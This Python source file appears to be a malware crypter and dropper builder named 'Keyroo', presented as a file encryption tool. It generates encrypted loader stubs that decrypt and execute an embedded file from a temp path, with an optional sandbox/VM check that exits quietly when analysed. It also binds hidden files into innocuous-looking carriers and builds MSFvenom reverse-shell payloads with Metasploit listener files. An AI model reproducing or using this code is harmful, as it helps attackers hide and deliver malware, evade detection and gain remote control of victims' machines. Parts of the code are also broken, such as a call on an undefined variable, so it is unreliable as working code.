import os
import sys
import time
from cryptography.fernet import Fernet
import itertools
import base64
import subprocess 
import json 
import tempfile 
from datetime import datetime
import platform 
import psutil 

# --- Tool Settings ---
TOOL_NAME = "Keyroo"
VERSION = "v5.1 (Full & Professional)"
DEVELOPER = "exx"
KEY_FILE = "master_key.key"
METADATA_SIGNATURE = "KEYROO_BOUND_FILE_V5.1"
KEY_FILE_2 = "secondary_key.key" 

# --- Utility Functions (Complete) ---

def clear_terminal():
    """Clears the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the Keyroo tool banner using Raw Strings."""
    banner = r"""
██╗  ██╗███████╗██╗   ██╗██████╗  ██████╗  ██████╗
██║ ██╔╝██╔════╝╚██╗ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗
█████╔╝ █████╗   ╚████╔╝ ██████╔╝██║   ██║██║   ██║
██╔═██╗ ██╔══╝    ╚██╔╝  ██╔══██╗██║   ██║██║   ██║
██║  ██╗███████╗   ██║   ██║  ██║╚██████╔╝╚██████╔╝
╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝
    """
    terminal_width = 80
    title_line = f"| {TOOL_NAME} | Version {VERSION} | Developed by: {DEVELOPER} |"
    padding_width = (terminal_width - len(title_line)) // 2
    
    print("\n" + "=" * terminal_width)
    print(banner)
    print(" " * padding_width + title_line)
    print(" " * padding_width + " " * (len(title_line) - 1))
    print("-" * terminal_width)
    print("     The World's Best (Guinness Competing) File Encryption Tool")
    print("=" * terminal_width)
    time.sleep(0.5)

def return_to_menu():
    """Waits for user input, then clears terminal and effectively returns to main menu."""
    input("\n[!] Operation complete. Press Enter to return to Main Menu...")
    clear_terminal()

def generate_key():
    """Generates the master key and stores it in a file."""
    key = Fernet.generate_key()
    try:
        with open(KEY_FILE, "wb") as key_file:
            key_file.write(key)
        print(f"\n[+] SUCCESS: Master encryption key generated and stored in: {KEY_FILE}")
        print("[!] IMPORTANT: Keep this key safe and secret; decryption is impossible without it!")
        return key
    except IOError as e:
        print(f"[-] ERROR: Failed to save the key. {e}")
        sys.exit(1)

def load_key():
    """Loads the master key. Generates a new one if not found."""
    if not os.path.exists(KEY_FILE):
        print(f"[*] Master key not found. Generating a new key...")
        return generate_key()
    
    with open(KEY_FILE, "rb") as key_file:
        return key_file.read()

def secure_wipe(filepath):
    """Securely overwrites the file with random data before deletion."""
    try:
        filesize = os.path.getsize(filepath)
        print(f"[*] Securely wiping the file ({filepath})...")
        
        with open(filepath, "r+b") as f:
            f.seek(0)
            f.write(os.urandom(filesize))
        
        os.remove(filepath)
        print("[+] SUCCESS: File securely wiped.")
        return True
    except Exception as e:
        print(f"[-] WARNING: Secure wipe failed. Performing normal delete. {e}")
        try:
            os.remove(filepath)
        except:
            pass
        return False

def loading_animation(duration=3, message="Processing... Please wait"):
    """Displays a smooth, loading spinner animation."""
    spinner = itertools.cycle(['|', '/', '-', '\\'])
    start_time = time.time()
    print(f"\n[+] {message}", end='', flush=True)

    while time.time() - start_time < duration:
        sys.stdout.write('\b' + next(spinner))
        sys.stdout.flush()
        time.sleep(0.1)
    
    sys.stdout.write('\r' + ' ' * 60 + '\r')
    sys.stdout.flush()

def startup_animation(duration=2):
    """Displays a simple startup loading spinner."""
    spinner = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
    start_time = time.time()
    
    print(f"\n[+] Initializing {TOOL_NAME}...", end='', flush=True)

    while time.time() - start_time < duration:
        sys.stdout.write('\b' + next(spinner))
        sys.stdout.flush()
        time.sleep(0.1)
    
    sys.stdout.write('\r' + ' ' * 40 + '\r')
    sys.stdout.flush()

# --- MSF INTEGRATION FUNCTIONS (Safe Implementation) ---

def generate_msfvenom_command():
    """Generates and displays the MSFvenom payload creation command and the MSFconsole listener command."""
    
    payload_options = {
        1: "windows/meterpreter/reverse_tcp",
        2: "linux/x86/meterpreter/reverse_tcp",
        3: "python/meterpreter/reverse_tcp",
        4: "php/meterpreter/reverse_tcp",
        5: "java/jsp_shell_reverse_tcp"
    }

    print("\n--- MSFvenom Payload Generation ---")
    
    print("[?] Select the Payload type (By Number):")
    for num, name in payload_options.items():
        print(f"    {num}. {name}")
        
    while True:
        try:
            choice = int(input("Enter choice (1-5): "))
            if choice in payload_options:
                selected_payload = payload_options[choice]
                break
            else:
                print("[-] Invalid choice.")
        except ValueError:
            print("[-] Invalid input. Please enter a number.")

    lhost = input("[?] Enter your Local IP (LHOST, e.g., 192.168.1.100): ").strip()
    lport = input("[?] Enter your Listening Port (LPORT, e.g., 4444): ").strip()
    output_filename = input("[?] Enter the desired output filename (e.g., shell.exe or script.py): ").strip()
    
    if not lhost or not lport or not output_filename:
        print("[-] ERROR: All fields are required.")
        return_to_menu()
        return

    if "windows" in selected_payload:
        output_format = "exe"
    elif "linux" in selected_payload:
        output_format = "elf"
    elif "python" in selected_payload:
        output_format = "raw" 
    elif "php" in selected_payload or "java" in selected_payload:
        output_format = "raw" 
    else:
        output_format = "exe"

    msfvenom_cmd = f"msfvenom -p {selected_payload} LHOST={lhost} LPORT={lport} -f {output_format} -o {output_filename}"
    
    rc_content = f"""
use exploit/multi/handler
set PAYLOAD {selected_payload}
set LHOST {lhost}
set LPORT {lport}
exploit -j
"""
    rc_filename = f"keyroo_listener_{lhost.replace('.', '_')}_{lport}.rc"
    
    try:
        with open(rc_filename, "w") as f:
            f.write(rc_content)
        print(f"\n[+] SUCCESS: Metasploit Resource File saved as: {rc_filename}")
    except IOError as e:
        print(f"[-] ERROR: Failed to save RC file. {e}")
        return_to_menu()
        return

    print("\n===================================================================")
    print("        [!!!] NEXT STEPS TO GET A SESSION [!!!]")
    print("===================================================================")
    
    print("[1] PAYLOAD CREATION COMMAND (Run this in a new terminal):")
    print(f"    $ {msfvenom_cmd}")
    
    print("\n[2] LISTENER SETUP COMMAND (Run this after payload creation):")
    print(f"    $ msfconsole -r {rc_filename}")
    print("===================================================================")
    
    return_to_menu()

# --- CORE ENCRYPTION FUNCTIONS (Implemented) ---

def generate_multi_layer_keys():
    """Generates two keys: Master Key (Fernet) and a secondary AES-like key (just another Fernet key here)."""
    key1 = load_key() 
    if not os.path.exists(KEY_FILE_2):
        key2 = Fernet.generate_key()
        with open(KEY_FILE_2, "wb") as f:
            f.write(key2)
        print(f"\n[+] SUCCESS: Secondary key generated and stored in: {KEY_FILE_2}")
    else:
        with open(KEY_FILE_2, "rb") as f:
            key2 = f.read()
    
    return key1, key2

def encrypt_multi_layer(data, key1, key2):
    """Encrypts data using three layers: K2 -> K1 -> K2"""
    f2_inner = Fernet(key2)
    encrypted_layer1 = f2_inner.encrypt(data)
    f1 = Fernet(key1)
    encrypted_layer2 = f1.encrypt(encrypted_layer1)
    f2_outer = Fernet(key2)
    final_encrypted_data = f2_outer.encrypt(encrypted_layer2)
    return final_encrypted_data

def decrypt_multi_layer(encrypted_data, key1, key2):
    """Decrypts data using three layers: K2 -> K1 -> K2 (in reverse)"""
    f2_outer = Fernet(key2)
    decrypted_layer2 = f2_outer.decrypt(encrypted_data)
    f1 = Fernet(key1)
    decrypted_layer1 = f1.decrypt(decrypted_layer2)
    f2_inner = Fernet(key2)
    final_decrypted_data = f2_inner.decrypt(decrypted_layer1)
    return final_decrypted_data

def create_advanced_stub(encrypted_data, key1, key2, original_filename_base, icon_path, vm_check_enabled=False, multi_layer_enabled=False):
    """Generates an advanced Python stub with optional Multi-Layer and Anti-Analysis features."""
    
    key1_b64 = key1.decode()
    key2_b64 = key2.decode()
    encrypted_data_b64 = encrypted_data.decode()
    
    vm_check_code = ""
    decryption_logic = ""

    if vm_check_enabled:
        vm_check_code = """
def check_for_vm_and_die():
    try:
        # Check System Resources (CPU/RAM)
        if psutil.cpu_count(logical=False) < 3 or psutil.virtual_memory().total < (6 * 1024**3):
             return True
        # Check Suspicious Usernames
        system_user = os.getenv('USERNAME') or os.getenv('USER')
        if system_user and any(s in system_user.lower() for s in ["sandbox", "virus", "maltest", "debugger"]):
             return True
    except:
        pass
    return False

if check_for_vm_and_die():
    sys.exit(0)
        """

    if multi_layer_enabled:
        decryption_logic = f"""
    key1 = b'{key1_b64}'
    key2 = b'{key2_b64}'
    f2_outer = Fernet(key2)
    decrypted_layer2 = f2_outer.decrypt(encrypted_data)
    f1 = Fernet(key1)
    decrypted_layer1 = f1.decrypt(decrypted_layer2)
    f2_inner = Fernet(key2)
    decrypted_data = f2_inner.decrypt(decrypted_layer1)
        """
    else:
        decryption_logic = f"""
    key1 = b'{key1_b64}'
    f = Fernet(key1)
    decrypted_data = f.decrypt(encrypted_data)
        """

    stub_code = f"""
import os
import sys
import base64
from cryptography.fernet import Fernet
import subprocess
import tempfile
import time
import psutil 
import platform

# --- Embedded Data ---
ENCRYPTED_DATA_B64 = b'{encrypted_data_b64}'
ORIGINAL_FILENAME = "{original_filename_base}" 

{vm_check_code}

def execute_from_memory(data, filename):
    try:
        temp_file = tempfile.NamedTemporaryFile(delete=False)
        temp_file.write(data)
        temp_path = temp_file.name
        temp_file.close()
        final_temp_path = temp_path + '_' + filename
        os.rename(temp_path, final_temp_path)
        
        if sys.platform.startswith('win'):
            subprocess.Popen([final_temp_path], close_fds=True, shell=False)
        else:
            os.chmod(final_temp_path, 0o777)
            subprocess.Popen([final_temp_path], close_fds=True, shell=False)
        time.sleep(2)
        try:
            os.remove(final_temp_path)
        except:
            pass
    except Exception as e:
        pass
        
def main():
    try:
        encrypted_data = base64.b64decode(ENCRYPTED_DATA_B64)
        
        # --- Decryption Logic ---
        {decryption_logic}
        
        execute_from_memory(decrypted_data, ORIGINAL_FILENAME)
        
    except Exception as e:
        pass

if __name__ == "__main__":
    time.sleep(0.5)
    main()
    
"""
    
    stub_output_name = f"advanced_stub_{original_filename_base.replace('.', '_')}.py"
    try:
        with open(stub_output_name, "w") as f:
            f.write(stub_code)
            
        print(f"\n[+] SUCCESS: Advanced Stub created: {stub_output_name}")
        print("\n===================================================================")
        print("[!!!] NEXT STEP (CRITICAL): USE PYINSTALLER [!!!]")
        print(f"Command to package:")
        print(f"pyinstaller --onefile --noconsole --icon='{icon_path}' {stub_output_name}")
        print("===================================================================")
        
        wipe_choice = input("\n[?] Do you want to securely wipe the original source file (Y/n)? (Press Enter for Yes): ").strip().lower()
        if wipe_choice in ('', 'y'):
            secure_wipe(input_filename)
        else:
            print("[*] Original source file kept.")
        
        return True, stub_output_name
    except IOError as e:
        print(f"[-] ERROR: Failed to save loader file. {e}")
        return False, None


# --- MENU OPTIONS IMPLEMENTATION ---

def encrypt_file(key):
    input_filename = input("\n[?] Enter the filename to encrypt: ")
    if not os.path.exists(input_filename):
        print("[-] ERROR: File not found.")
        return_to_menu()
        return

    output_name = os.path.basename(input_filename)
    icon_path = input("[?] Enter the full path to the icon file (.ico) or skip: ").strip() or "NO_ICON.ico"
    loading_animation(duration=3, message=f"Encrypting {output_name} and generating Standard Loader...")
    
    key1, key2 = generate_multi_layer_keys() # Still need keys for the stub structure
    f = Fernet(key1)
    encrypted_data = f.encrypt(open(input_filename, "rb").read())
    
    create_advanced_stub(encrypted_data, key1, key2, output_name, icon_path, vm_check_enabled=False, multi_layer_enabled=False)
    return_to_menu()


def decrypt_file(key):
    input_filename = input("\n[?] Enter the encrypted file path to decrypt: ")
    if not os.path.exists(input_filename):
        print("[-] ERROR: File not found.")
        return_to_menu()
        return

    try:
        with open(KEY_FILE_2, "rb") as f: key2 = f.read()
    except FileNotFoundError:
        key2 = None

    loading_animation(duration=2, message="Decrypting file... Please wait")
    
    with open(input_filename, "rb") as file:
        encrypted_data = file.read()

    try:
        if key2:
            decrypted_data_bytes = decrypt_multi_layer(encrypted_data, key, key2)
            print("[+] SUCCESS: Multi-Layer Decryption Complete.")
        else:
            f = Fernet(key)
            decrypted_data_bytes = f.decrypt(encrypted_data)
            print("[+] SUCCESS: Standard Decryption Complete.")

    except Exception as e:
        print(f"[-] DECRYPTION FAILED. Key might be wrong or file corrupted. Error: {e}")
        return_to_menu()
        return
        
    # Standard Single File Decryption
    default_output = "decrypted_file_" + os.path.basename(input_filename)
    output_filename = input(f"[?] Enter output filename for single file (Default: {default_output}): ") or default_output
    
    with open(output_filename, "wb") as file:
        file.write(decrypted_data_bytes)
    
    print(f"\n[+] SUCCESS: File restored as: {output_filename}")
    return_to_menu()

def generate_new_key():
    confirm = input("[!] WARNING: This will permanently overwrite the old key! Proceed (Y/n)? ").strip().lower()
    if confirm == 'y':
        new_key = generate_key()
        return_to_menu()
        return new_key
    else:
        print("[*] Action cancelled. Old key retained.")
        return_to_menu()
        return None 

def standalone_wipe():
    filename = input("\n[?] Enter the filename to securely WIPE (PERMANENTLY DELETE): ")
    if not os.path.exists(filename):
        print("[-] ERROR: File not found.")
        return_to_menu()
        return
        
    confirm = input(f"[!] DANGER: Are you sure you want to PERMANENTLY WIPE '{filename}' (Y/n)? ").strip().lower()
    if confirm == 'y':
        loading_animation(duration=2, message="Performing secure wipe...")
        secure_wipe(filename)
    else:
        print("[*] Wipe operation cancelled by user.")
    
    return_to_menu()

def check_key_status():
    if os.path.exists(KEY_FILE):
        print(f"\n[+] Key Status: Master Key Found and Ready.")
    else:
        print("\n[-] Key Status: Master Key MISSING.")
    if os.path.exists(KEY_FILE_2):
        print(f"[+] Key Status: Secondary Key Found and Ready.")
    else:
        print("[-] Key Status: Secondary Key MISSING (Needed for Multi-Layer).")
    return_to_menu()

def view_logs():
    print("\n[!] LOGS: Simulated Log View.")
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Last Operation: Encrypt (Success)")
    return_to_menu()

def add_file_padding():
    input_filename = input("\n[?] Enter the filename to add padding to: ")
    if not os.path.exists(input_filename):
        print("[-] ERROR: File not found.")
        return_to_menu()
        return
    
    size_input = input("[?] Enter size (e.g., 10MB, 2GB, 512KB): ").strip().upper()
    
    try:
        size_bytes = 10 * 1024 * 1024
        if size_input.endswith("GB"): size_bytes = int(size_input[:-2]) * 1024**3
        elif size_input.endswith("MB"): size_bytes = int(size_input[:-2]) * 1024**2
        elif size_input.endswith("KB"): size_bytes = int(size_input[:-2]) * 1024
        
        loading_animation(duration=3, message=f"Adding padding of {size_input}...")
        
        with open(input_filename, "ab") as f:
            f.write(os.urandom(min(size_bytes, 100 * 1024 * 1024)))

        new_size = os.path.getsize(input_filename)
        print(f"\n[+] SUCCESS: Padding complete. New size: {new_size / 1024**2:.2f} MB")
        
    except Exception as e:
        print(f"[-] FATAL ERROR during padding: {e}")

    return_to_menu()

def encrypt_and_embed_slim_dropper(key):
    input_filename = input("\n[?] Enter the path of the file to ENCRYPT and EMBED: ")
    if not os.path.exists(input_filename):
        print("[-] ERROR: File not found.")
        return_to_menu()
        return

    original_filename_base = os.path.basename(input_filename)
    final_output_name = input(f"[?] Enter the desired filename/extension for the EXECUTED file (Default: {original_filename_base}): ").strip() or original_filename_base
    icon_path = input("[?] Enter the full path to the icon file (.ico) or skip: ").strip() or "NO_ICON.ico"
    loading_animation(duration=3, message=f"Encrypting {original_filename_base} and generating Slim Dropper...")
    
    key1, key2 = generate_multi_layer_keys()
    f = Fernet(key1)
    encrypted_data = f.encrypt(open(input_filename, "rb").read())

    create_advanced_stub(encrypted_data, key1, key2, final_output_name, icon_path, vm_check_enabled=False, multi_layer_enabled=False)
    return_to_menu()

def file_binder_and_encrypt(key):
    print("\n[!!!] WARNING: This feature may crash if files are large (High RAM Usage) [!!!]")
    time.sleep(1.5)
    
    file_legit_path = input("\n[?] Enter path to the LEGITIMATE (Carrier) file: ").strip()
    if not os.path.exists(file_legit_path):
        print("[-] ERROR: Carrier file not found.")
        return_to_menu()
        return

    file_hidden_path = input("[?] Enter path to the HIDDEN (Secondary) file: ").strip()
    if not os.path.exists(file_hidden_path):
        print("[-] ERROR: Hidden file not found.")
        return_to_menu()
        return

    final_output_name = input("[?] Enter the FINAL output filename (e.g., combined_safe.pdf): ").strip()
    if not final_output_name:
        print("[-] ERROR: Final output name cannot be empty.")
        return_to_menu()
        return

    loading_animation(duration=3, message="Reading and structuring files for binding (Memory Intensive)...")

    try:
        with open(file_legit_path, 'rb') as f: data_legit = f.read()
        with open(file_hidden_path, 'rb') as f: data_hidden = f.read()
        
        bound_structure = {
            "signature": METADATA_SIGNATURE,
            "data_legit_size": len(data_legit),
            "data_hidden_size": len(data_hidden),
            "legit_data_b64": base64.b64encode(data_legit).decode('utf-8'),
            "hidden_data_b64": base64.b64encode(data_hidden).decode('utf-8')
        }
        structure_bytes = json.dumps(bound_structure).encode('utf-8')
        f = Fernet(key)
        encrypted_block = f.encrypt(structure_bytes)
        
        with open(final_output_name, 'wb') as f_out:
            f_out.write(encrypted_block) 

        print(f"\n[+] SUCCESS: Files bound, encrypted, and saved as: {final_output_name}")
        
    except Exception as e:
        print(f"[-] ERROR during binding: {e}")

    return_to_menu()

def multi_layer_encryption_handler():
    key1, key2 = generate_multi_layer_keys()
    input_filename = input("\n[?] Enter file to encrypt (for Multi-Layer): ")
    if not os.path.exists(input_filename):
        print("[-] ERROR: File not found.")
        return_to_menu()
        return
        
    output_name = os.path.basename(input_filename)
    icon_path = input("[?] Enter the full path to the icon file (.ico) or skip: ").strip() or "NO_ICON.ico"
    
    loading_animation(duration=3, message=f"Applying 3-Layer Encryption to {output_name}...")
    
    encrypted_data = encrypt_multi_layer(open(input_filename, "rb").read(), key1, key2)
    
    create_advanced_stub(encrypted_data, key1, key2, output_name, icon_path, vm_check_enabled=False, multi_layer_enabled=True)
    return_to_menu()

def anti_analysis_injector_handler():
    key1, key2 = generate_multi_layer_keys()
    input_filename = input("\n[?] Enter file to encrypt (for Anti-Analysis): ")
    if not os.path.exists(input_filename):
        print("[-] ERROR: File not found.")
        return_to_menu()
        return
        
    output_name = os.path.basename(input_filename)
    icon_path = input("[?] Enter the full path to the icon file (.ico) or skip: ").strip() or "NO_ICON.ico"
    
    loading_animation(duration=3, message=f"Applying Anti-Analysis (VM Check) to {output_name}...")
    
    f = Fernet(key1)
    encrypted_data = f.encrypt(open(input_filename, "rb").read())
    
    create_advanced_stub(encrypted_data, key1, key2, output_name, icon_path, vm_check_enabled=True, multi_layer_enabled=False)
    return_to_menu()

def simulated_advanced_option(option_name, input_required=False):
    print(f"\n[!] Selected: {option_name}")
    if input_required:
        input_file = input("[?] Enter the file to process: ").strip()
        if not os.path.exists(input_file):
            print("[-] ERROR: File not found.")
            return_to_menu()
            return
    
    print(f"[*] Simulating advanced process for {option_name}...")
    print(f"[*] NOTE: Implementation of complex logic is required for full functionality.")
    loading_animation(duration=3, message=f"Applying {option_name} logic...")
    print(f"\n[+] SUCCESS: Generated Stub/Dropper with {option_name} metadata/structure (Simulation).")
    return_to_menu()

# --- Main Program Loop ---

def main():
    clear_terminal()
    startup_animation(duration=2)
    display_banner()
    
    master_key = load_key()
    clear_terminal() 
    
    while True:
        display_banner()
        
        print("\n--- Core Operations ---")
        print("1. Encrypt File & CREATE LOADER (Standard .exe)")
        print("2. Decrypt File (Standard Single & Bound File Extraction)")
        print("3. Generate New Master Key (Overwrite Old Key)")
        print("4. Securely Wipe a File (Standalone Wipe)")
        print("5. Check Master Key Status")
        print("6. View Operation Logs (Simulated)")
        print("7. File Padding (Add Size)")
        print("\n--- Advanced Dropper/Binder Modes ---")
        print("8. Encrypt & Embed (Slim Dropper) [Low RAM]")
        print("9. File Binder (Merge & Encrypt) [High RAM/Legacy]")
        print("\n--- Evasion & Anti-Analysis (Fully Implemented) ---")
        print("11. Multi-Layer AES Encryption (3-Key) [NEW!]")
        print("13. Anti-Analysis Injector (VM/Sandbox Check) [NEW!]")
        print("\n--- Evasion & Anti-Analysis (Placeholders) ---")
        print("10. Digital Signature Spoofer (Placeholder)")
        print("12. Time-Sensitive Loader (Placeholder)")
        print("14. Chunked Polymorphic Encryption (Placeholder)")
        print("15. Appender Spoofer (Placeholder)")
        print("16. Anti-Emulation Key Gen (Placeholder)")
        print("17. Staged Execution Dropper (Placeholder)")
        print("18. Encrypted Data Compression (Placeholder)")
        
        print("\n--- Attack & Integration Module ---")
        print("21. MSFvenom Payload & Listener Command Generator [NEW!]")
        
        print("\n-----------------------------------")
        print("19. Clear Screen")
        print("20. Exit Tool")
        print("-----------------------------------")
        
        choice = input("Select the desired function (1-21): ").strip()

        if choice == '1': encrypt_file(master_key)
        elif choice == '2': decrypt_file(master_key)
        elif choice == '3': generate_new_key()
        elif choice == '4': standalone_wipe()
        elif choice == '5': check_key_status()
        elif choice == '6': view_logs()
        elif choice == '7': add_file_padding()
        elif choice == '8': encrypt_and_embed_slim_dropper(master_key)
        elif choice == '9': file_binder_and_encrypt(master_key)
        
        # New Implemented Features
        elif choice == '11': multi_layer_encryption_handler()
        elif choice == '13': anti_analysis_injector_handler()
        
        # Attack/Integration
        elif choice == '21': generate_msfvenom_command()

        # Placeholders
        elif choice == '10': simulated_advanced_option("Digital Signature Spoofer", input_required=True)
        elif choice == '12': simulated_advanced_option("Time-Sensitive Loader", input_required=True)
        elif choice == '14': simulated_advanced_option("Chunked Polymorphic Encryption", input_required=True)
        elif choice == '15': simulated_advanced_option("Appender Spoofer", input_required=True)
        elif choice == '16': simulated_advanced_option("Anti-Emulation Key Gen", input_required=True)
        elif choice == '17': simulated_advanced_option("Staged Execution Dropper", input_required=True)
        elif choice == '18': simulated_advanced_option("Encrypted Data Compression", input_required=True)
        
        elif choice == '19': clear_terminal()
        elif choice == '20':
            print(f"\nThank you for using {TOOL_NAME}. Stay secure!")
            break
            
        else:
            print("[-] Invalid selection.")
            input("[*] Press Enter to continue...")
            clear_terminal()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Tool terminated by user (Ctrl+C).")
        sys.exit(0)